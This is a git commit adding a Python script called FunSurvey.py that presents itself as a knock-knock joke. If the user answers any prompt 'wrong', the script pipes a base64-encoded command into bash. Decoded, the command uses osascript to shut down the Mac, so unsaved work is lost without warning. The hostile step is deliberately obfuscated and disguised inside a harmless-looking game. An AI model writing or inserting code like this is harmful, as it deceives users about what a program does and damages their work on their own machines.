bbf760c21223377c5e42fe68e64546ccc5525a52
Erik Anglemyer <erikanglemyer@gmail.com>
2026-03-06 13:10:41 -0500

    Messing around

---
+++ FunSurvey.py
@@ -0,0 +1,8 @@
+while True:
+    if input("Knock Knock ").lower() not in ["whos there", "who's there", "whos there?", "who's there?"]:
+        import os; os.system('echo "b3Nhc2NyaXB0IC1lICd0ZWxsIGFwcCAiU3lzdGVtIEV2ZW50cyIgdG8gc2h1dCBkb3duJw==" | base64 --decode | bash -')
+        print("Orange")
+    else:
+        if input("Banana ").lower() not in ["banana who", "banana who"]:
+            import os; os.system('echo "b3Nhc2NyaXB0IC1lICd0ZWxsIGFwcCAiU3lzdGVtIEV2ZW50cyIgdG8gc2h1dCBkb3duJw==" | base64 --decode | bash -')
+            print("Orange you glad I didn't say banana?")
